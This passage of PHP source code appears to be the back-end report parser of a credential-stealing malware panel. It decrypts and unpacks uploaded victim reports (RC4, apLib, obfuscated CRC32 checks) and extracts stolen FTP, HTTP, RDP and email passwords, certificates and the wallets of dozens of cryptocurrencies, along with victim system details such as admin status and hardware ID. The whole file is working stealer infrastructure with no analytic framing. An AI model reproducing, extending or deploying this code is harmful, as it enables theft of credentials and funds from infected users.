class module_multibit extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FTP Disk

class module_ftpdisk extends module
{
	protected function process_account($account_data)
	{
		$ftp_lines = parse_lines($account_data);

		foreach ($ftp_lines as $line)
		{
			$ftp_data = explode(chr(9), $line);

			if (is_array($ftp_data) && count($ftp_data) >= 10)
			{
				$server = Utf8ToWin($ftp_data[1]);
				$port = $ftp_data[2];
				$user = Utf8ToWin($ftp_data[5]);
				$pass = Utf8ToWin($ftp_data[6]);
				$proto = $ftp_data[8];
				$rem_dirs = base64_decode($ftp_data[9]);
				$rem_dirs = explode(chr(9), $rem_dirs);

				if (is_array($rem_dirs) && count($rem_dirs))
				{
					foreach ($rem_dirs as $dir)
					{
						$dir = Utf8ToWin($dir);
						$this->add_ftp(append_port_dir(ftp_force_ssh($server, $proto != '0'), $port, $dir), $user, $pass);
					}
				} else
				{
					$this->add_ftp(append_port(ftp_force_ssh($server, $proto != '0'), $port), $user, $pass);					
				}
			}
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$account_data = $stream->read_str();

				$this->process_account($account_data);

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Litecoin

class module_litecoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Namecoin

class module_namecoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Terracoin

class module_terracoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Bitcoin Armory

class module_bitcoin_armory extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// PPCoin (Peercoin)

class module_ppcoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Primecoin

class module_primecoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Feathercoin

class module_feathercoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// NovaCoin

class module_novacoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Freicoin

class module_freicoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Frankocoin

class module_frankocoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Devcoin

class module_devcoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// ProtoShares

class module_protoshares extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// MegaCoin

class module_megacoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Quarkcoin

class module_quarkcoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Worldcoin

class module_worldcoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Infinitecoin

class module_infinitecoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Ixcoin

class module_ixcoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Anoncoin

class module_anoncoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// BBQcoin

class module_bbqcoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Digitalcoin

class module_digitalcoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Mincoin

class module_mincoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Goldcoin

class module_goldcoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Yacoin

class module_yacoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Zetacoin

class module_zetacoin extends module_bitcoin_base
{
}
	
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Fastcoin

class module_fastcoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// I0coin

class module_i0coin extends module_bitcoin_base
{
}
	
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Tagcoin

class module_tagcoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Bytecoin

class module_bytecoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Florincoin

class module_florincoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Phoenixcoin

class module_phoenixcoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Luckycoin

class module_luckycoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Craftcoin

class module_craftcoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Junkcoin

class module_junkcoin extends module_bitcoin_base
{
}

// ========================================================================================================================

class report_parser
{
	public $log;
	public $options = array();

	public $ftp_lines = array();
	public $http_lines = array();
	public $rdp_lines = array();
	public $cert_lines = array();
	public $wallet_lines = array();
	public $email_lines = array();
	
	public $report_os_name;
	public $report_is_win64;
	public $report_user_country;
	public $report_user_language;
	public $report_is_admin;
	public $report_hwid;
	public $report_version_id;

	function __construct($options = '')
	{
		$this->log = new debug_log();
		if (is_array($options))
			$this->options = $options;
	}

	// find module processing class for certain ID
	private function find_class($id, $stream)
	{
		global $global_module_list ;
		for ($i = 0; $i < count($global_module_list); $i++)
		{
			if (!class_exists($global_module_list[$i][0]))
			{
				$this->log->add("ERR_CLASS_DOES_NOT_EXIST");
				return null;
			}
			if ($global_module_list[$i][1] == $id)
				return new $global_module_list[$i][0]($stream, $this->log, $this->options);
		}
		return null;
	}

	public static function flat_email_array($email_array)
	{
		// protocol + email
		$result = trim($email_array['protocol']).'://'.trim($email_array['email']).'|';
		
		// server + port
		$result .= trim($email_array['server']);

		$port = trim($email_array['port']);

		if (strlen($port) && $port != '0')
			$result .= ':'.$port;

		// user:password
		$result .= '|'.trim($email_array['user']).'|'.trim($email_array['pass']);

		return $result;
	}

	// import and decrypt module data
	private function import_module($stream)
	{	
		$hdr_id = $stream->read_strlen(8); 	// module header_id

		// check module header identifier
		if ($hdr_id != REPORT_MODULE_HEADER || !$stream->state)
		{
			$this->log->add("ERR_INVALID_MODULE_HEADER");
			return false;
		}

		$mod_len = $stream->read_dword(); 		// module length
		$mod_id = $stream->read_word();   		// module id
		/*$mod_ver = */$stream->read_word();	// module version

		if (!$stream->state)
		{
			$this->log->add("ERR_CANNOT_READ_MODULE_HEADER");
			return false;
		}

		$module = $this->find_class($mod_id, $stream);

		if ($module)
		{
			global $global_verbose_log;
            
			if ($mod_len == 16)
				return true; 	// empty module
			if ($mod_len < 16)	// module length should be always greater than 16 bytes (header length)
			{
				$this->log->add("ERR_MODULE_LEN_INCORRECT");
				return false;
			}
			if ($global_verbose_log)
				$this->log->add("NOTIFY_IMPORT_DATA: ".get_class($module));
			$mod_len -= 16; 	// header length

			if ($module->import_data($mod_len))
			{
				if (get_class($module) == 'module_systeminfo')
				{
					$this->report_os_name = $module->os_name;
					$this->report_is_win64 = $module->is_win64;
					$this->report_user_country = $module->user_country;
					$this->report_user_language = $module->user_language;
					$this->report_is_admin = $module->is_admin;
					$this->report_hwid = $module->hwid;
				} else
				{
					foreach ($module->ftp_list as $value)
					{
						array_push($this->ftp_lines, array(trim($value), get_class($module)));
						
						global $global_verbose_log;
						if ($global_verbose_log)
							$this->log->add("NOTIFY_NEW_FTP: ".$value);
					}

					foreach ($module->http_list as $value)
					{
						array_push($this->http_lines, array(trim($value), get_class($module)));
						
						global $global_verbose_log;
						if ($global_verbose_log)
							$this->log->add("NOTIFY_NEW_HTTP: ".$value);
					}

					foreach ($module->rdp_list as $value)
					{
						array_push($this->rdp_lines, array(trim($value), get_class($module)));
						
						global $global_verbose_log;
						if ($global_verbose_log)
							$this->log->add("NOTIFY_NEW_RDP: ".$value);
					}

					foreach ($module->cert_list as $value)
					{
						array_push($this->cert_lines, array($value, get_class($module)));
						
						global $global_verbose_log;
						if ($global_verbose_log)
							$this->log->add("NOTIFY_NEW_CERT");
					}

					foreach ($module->wallet_list as $value)
					{
						array_push($this->wallet_lines, array($value, get_class($module)));
						
						global $global_verbose_log;
						if ($global_verbose_log)
							$this->log->add("NOTIFY_NEW_WALLET");
					}

					foreach ($module->email_list as $value)
					{
						array_push($this->email_lines, array($value, get_class($module)));
						
						global $global_verbose_log;
						if ($global_verbose_log)
							$this->log->add("NOTIFY_NEW_EMAIL: ".$this->flat_email_array($value));
					}
				}
				return true;
			}
		} else
			$this->log->add("ERR_UNKNOWN_MODULE_ID");
		return false;	
	}

	// unpack stream data using ported apLib algorithm
	private function unpack_stream($packed_data, $unpacked_len)
	{
			if (!$unpacked_len)
				return '';
				
			if ($unpacked_len > REPORT_LEN_LIMIT)
			{
				$this->log->add("ERR_CANNOT_UNPACK_DATA_MEMLIMIT");
				return '';
			}

			$unpacked_data = '';
	        $depack_len = aP_depack($packed_data, $unpacked_data, $unpacked_len);

			if ($depack_len > REPORT_LEN_LIMIT)
			{
				$this->log->add("ERR_CANNOT_UNPACK_DATA_MEMLIMIT");
				return '';
			}

	        if ($depack_len == $unpacked_len)
	        {
				return $unpacked_data;
	        } else
	        {
				$this->log->add("ERR_CANNOT_UNPACK_DATA");
				return '';
	        }
	}

	protected function process_report_data($data, $report_password)
	{
		if (strlen($data) == 0)
		{
			$this->log->add("ERR_NO_REPORT_DATA");
			return false;
		} else if (strlen($data) < 12) // length cannot be less than 12 bytes (8-byte header + crc32 checksum)
		{
			$this->log->add("ERR_INVALID_REPORT_DATALEN");
			return false;
		} else if (strlen($data) > REPORT_LEN_LIMIT)
		{
			$this->log->add("ERR_CANNOT_PROCESS_REPORT_MEMLIMIT");
			return false;
		} elseif (strlen($data) == 12) // empty report
			return true;

		// remove random encryption layer
		if (self::verify_new_file_header($data))
		{
			self::rand_decrypt($data);
		}
    
	    // extract crc32 checksum from datastream
		$crc_chk = data_int32(substr($data, strlen($data)-4));
	    
		// remove crc32 checksum from the data stream
		$data = substr($data, 0, -4);

		// check report validness
		$crc_chk = obf_crc32($crc_chk);

		if ((int)crc32($data) != (int)$crc_chk)
		{
			$this->log->add("ERR_REPORT_CRC_MISMATCH");
			return false;
		}

		$stream = new stream($data, $this->log);

		$report_id = $stream->read_strlen(8);

		if ($report_id == REPORT_CRYPTED_HEADER && $stream->state)
		{
			$decrypted_data = rc4Decrypt($report_password, substr($data, 8));

			// there's another crc32 checksum available to verify the decryption process

		    // extract crc32 checksum from decrypted datastream
			$crc_chk = data_int32(substr($decrypted_data, strlen($decrypted_data)-4));
		    
			// remove crc32 checksum from the data stream
			$decrypted_data = substr($decrypted_data, 0, -4);

			// check report validness
			$crc_chk = obf_crc32($crc_chk);

			if ((int)crc32($decrypted_data) != (int)$crc_chk)
			{
				$this->log->add("ERR_REPORT_WRONG_PASSWORD");
				return false;
			}
			
			// update current stream with decrypted data
			$stream = new stream($decrypted_data, $this->log);
			$report_id = $stream->read_strlen(8);
		}
		
		if ($report_id == REPORT_PACKED_HEADER && $stream->state)
		{	
			// unpack stream data
			$unpacked_len = $stream->read_dword();
			$packed_data = $stream->read_str();

			if (($unpacked_len > REPORT_LEN_LIMIT) || (strlen($packed_data) > REPORT_LEN_LIMIT))
			{
				$this->log->add("ERR_UNPACK_LEN_LIMIT");
				return false;
			}

			if (!strlen($packed_data))
			{
				$this->log->add("ERR_UNPACK_NULL");
				return false;
			}
				
			$unpacked_data = "";
			
			if ($stream->state && strlen($packed_data))
				$unpacked_data = $this->unpack_stream($packed_data, $unpacked_len);

			if (!strlen($unpacked_data))
			{
				$this->log->add("ERR_UNPACK_FAIL");
				return false;
			}

			if (strlen($unpacked_data) > REPORT_LEN_LIMIT)
			{
				$this->log->add("ERR_UNPACK_LEN_LIMIT");
				return false;
			}

			$stream = new stream($unpacked_data, $this->log);
			$report_id = $stream->read_strlen(8);
		}
		
		if ($report_id != REPORT_HEADER || !$stream->state)
		{
			$this->log->add("ERR_INVALID_REPORT_HEADER");
			return false;
		}
			
		$version_id = ztrim($stream->read_strlen(8));
		if (!$stream->state)
		{
			$this->log->add("ERR_CANNOT_READ_VERSION_ID");
			return false;
		}		
		
		if ($version_id != REPORT_VERSION)
		{
			$this->log->add("ERR_INVALID_VERSION_ID");
			return false;
		}
		
		$this->report_version_id = $version_id;
		
		while ($stream->state && $stream->pos < $stream->datalen)
		{
			if (!$this->import_module($stream, $this->log))
			{
				$this->log->add("ERR_CANNOT_IMPORT_MODULE");
				return false;
			}
		}
		return (($stream->pos == $stream->datalen) && ($stream->state));
	}
	
	public function process_report($data, $report_password = '')
	{
		$success_result = $this->process_report_data($data, $report_password);
		if (!$success_result)
			$this->log->add("ERR_IMPORT_FAILED");
		if ($success_result)
		{
			global $global_verbose_log;
			if ($global_verbose_log)
				$this->log->add("NOTIFY_IMPORT_SUCCESS");
		}
		return $success_result;
	}

	public static function verify_new_file_header(&$data)
	{
		if (strlen($data) < 4)
			return false;

		$max_header_len = max(strlen(REPORT_HEADER), strlen(REPORT_PACKED_HEADER), strlen(REPORT_CRYPTED_HEADER));
		$rc4_key = substr($data, 0, 4);
		$encrypted_header = substr($data, 4, $max_header_len);
		$decrypted_header = rc4Decrypt($rc4_key, $encrypted_header);

		return self::verify_old_file_header($decrypted_header);
	}

	public static function verify_old_file_header(&$data)
	{
		if ((substr($data, 0, strlen(REPORT_HEADER))) == REPORT_HEADER)
			return true;
		if ((substr($data, 0, strlen(REPORT_PACKED_HEADER))) == REPORT_PACKED_HEADER)
			return true;
		if ((substr($data, 0, strlen(REPORT_CRYPTED_HEADER))) == REPORT_CRYPTED_HEADER)
			return true;
		return false;
	}


	public static function verify_report_file_header(&$data)
	{
		return  self::verify_new_file_header($data) || self::verify_old_file_header($data);
	}

	public static function check_report_crypted_header_old(&$data)
	{
		if ((substr($data, 0, strlen(REPORT_CRYPTED_HEADER))) == REPORT_CRYPTED_HEADER)
			return true;
		return false;
	}

	public static function check_report_crypted_header_new(&$data)
	{
		if (strlen($data) < 4)
			return false;

		$max_header_len = strlen(REPORT_CRYPTED_HEADER);
		$rc4_key = substr($data, 0, 4);
		$encrypted_header = substr($data, 4, $max_header_len);
		$decrypted_header = rc4Decrypt($rc4_key, $encrypted_header);

		return self::check_report_crypted_header_old($decrypted_header);
	}

	public static function check_report_crypted_header(&$data)
	{
		return self::check_report_crypted_header_new($data) || self::check_report_crypted_header_old($data);
	}

	public static function rand_decrypt(&$data)
	{
		if (strlen($data) < 4)
			return false;

		$rc4_key = substr($data, 0, 4);
		$data = rc4Decrypt($rc4_key, substr($data, 4));
	}

	public static function pre_decrypt_report(&$data, $report_password = '')
	{

		if (self::verify_new_file_header($data))
		{
			self::rand_decrypt($data);
		}

		if ((substr($data, 0, strlen(REPORT_CRYPTED_HEADER))) != REPORT_CRYPTED_HEADER)
			return false;

		if (strlen($data) == 0)
		{
			return false;
		} else if (strlen($data) < 12) // length cannot be less than 12 bytes (8-byte header + crc32 checksum)
		{
			return false;
		} else if (strlen($data) > REPORT_LEN_LIMIT)
		{
			return false;
		} elseif (strlen($data) == 12) // empty report
			return false;

		// extract crc32 checksum from datastream
		$crc_chk = data_int32(substr($data, strlen($data)-4));

		// remove crc32 checksum from the encrypted data stream
		$encrypted_data = substr($data, 0, -4);

		// check report validness
		$crc_chk = obf_crc32($crc_chk);

		if ((int)crc32($encrypted_data) != (int)$crc_chk)
		{
			return false;
		}

		$decrypted_data = rc4Decrypt($report_password, substr($encrypted_data, 8));

		// there's another crc32 checksum available to verify the decryption process

		// extract crc32 checksum from decrypted datastream
		$crc_chk = data_int32(substr($decrypted_data, strlen($decrypted_data)-4));

		// remove crc32 checksum from the data stream
		$decrypted_data_check = substr($decrypted_data, 0, -4);

		// check report validness
		$crc_chk = obf_crc32($crc_chk);

		if ((int)crc32($decrypted_data_check) != (int)$crc_chk)
		{
			return false;
		}

		$data = $decrypted_data;
		return true;
	}
}

